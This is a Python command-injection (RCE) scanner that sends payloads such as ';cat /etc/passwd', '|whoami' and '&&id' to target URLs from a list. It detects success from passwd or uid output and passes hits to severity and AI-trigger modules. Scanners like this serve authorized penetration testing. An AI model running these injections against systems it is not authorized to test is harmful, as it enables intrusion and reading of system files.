import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def scan_rce(url):
    payloads = [
        ";cat /etc/passwd",
        "|whoami",
        "&&id",
        "|echo RCE_FOUND",
        ";echo vulnerable"
    ]

    headers = {
        "User-Agent": "ShadowFox-RCE-Scanner"
    }

    for payload in payloads:
        if "FUZZ" in url:
            test_url = url.replace("FUZZ", payload)
        else:
            test_url = f"{url}?cmd={payload}"

        try:
            res = requests.get(test_url, headers=headers, timeout=8)
            if "root:x:" in res.text or "uid=" in res.text or "RCE_FOUND" in res.text:
                log_to_text(f"[RCE] {test_url} -> {payload}")
                severity = classify_severity(res.text)
                ai_trigger_if_needed("RCE", test_url, payload, res.text, severity)
                print(f"[+] RCE DETEKTOVAN: {test_url}")
                return {"url": test_url, "payload": payload, "severity": severity}
        
        except Exception as e:
            print(f"[-] Greška kod {test_url}: {e}")

    print("[-] Nema RCE ranjivosti detektovanih.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        urls = f.read().splitlines()

    for url in urls:
        scan_rce(url)
